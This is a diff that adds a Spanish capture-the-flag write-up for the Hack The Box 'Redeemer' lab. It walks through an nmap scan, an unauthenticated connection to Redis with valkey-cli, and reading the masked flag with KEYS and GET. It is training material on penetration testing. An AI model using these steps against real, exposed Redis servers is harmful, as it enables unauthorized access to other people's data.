@@ -1,0 +1,100 @@
+---
+type: writeup
+title: Redeemer
+description: Explora la enumeración y explotación de un servidor de base de datos Redis, al tiempo que muestra la utilidad de línea de comandos redis-cli y los comandos básicos para interactuar con el servicio Redis.
+lang: es
+draft: false
+image: ../../../../images/writeups/hackthebox/machines/redeemer/redeemer.png
+platform: hackthebox
+url: https://app.hackthebox.com/machines/Redeemer
+difficulty: veryeasy
+os: linux
+hints: [redis]
+tags: [redis]
+---
+
+## Enumeration
+
+Escaneamos con `nmap` todos los puertos para ver cuáles están abiertos y qué servicios corren en ellos.
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/allports 10.129.195.241
+```
+
+```plaintext
+PORT     STATE SERVICE REASON
+6379/tcp open  redis   syn-ack ttl 63
+```
+
+Escaneamos el puerto abierto encontrado para ver más detalles sobre él.
+
+```bash
+nmap -p 6379 -sCV -oA nmap/openports 10.129.195.24
+```
+
+```plaintext
+PORT     STATE SERVICE VERSION
+6379/tcp open  redis   Redis key-value store 5.0.7
+```
+
+Buscamos como interactuar con el servicio redis desde la terminal y encontramos que existe una herramienta `valkey-cli` una rama de redis que se creó por motivos de cambios en las licencias.
+
+En la documentación podemos ver con qué comandos interactuar con el servicio.
+
+[Documentation: CLI](https://valkey.io/topics/cli/)
+
+## Exploitation
+
+Nos conectamos al servicio usando `valkey-cli`.
+
+```bash
+valkey-cli -h 10.129.123.246
+```
+
+El comando `help @generic` muestra documentación de todos los comandos que pertenecen a la categoría generic entre los que se encuentra `KEYS`.
+
+```plaintext
+KEYS pattern
+  summary: Returns all key names that match a pattern.
+  since: 1.0.0
+```
+
+```bash
+KEYS
+```
+
+```plaintext
+(error) ERR wrong number of arguments for 'keys' command
+10.129.123.246:6379> KEYS *
+1) "temp"
+2) "stor"
+3) "flag"
+4) "numb"
+```
+
+Las keys se usan para apuntar a datos guardados en la memoria RAM. Para obtener esos datos usamos el comando `GET`. Hay una key `flag`, vamos a usar el comando `GET` para obtener su valor.
+
+```bash
+help GET
+```
+
+```plaintext
+  GET key
+  summary: Returns the string value of a key.
+  since: 1.0.0
+  group: string
+```
+
+```bash
+GET flag
+```
+
+```plaintext
+"0******************************b"
+```
+
+### Flag
+
+<Callout type="success" title="Flag">
+0******************************b
+</Callout>
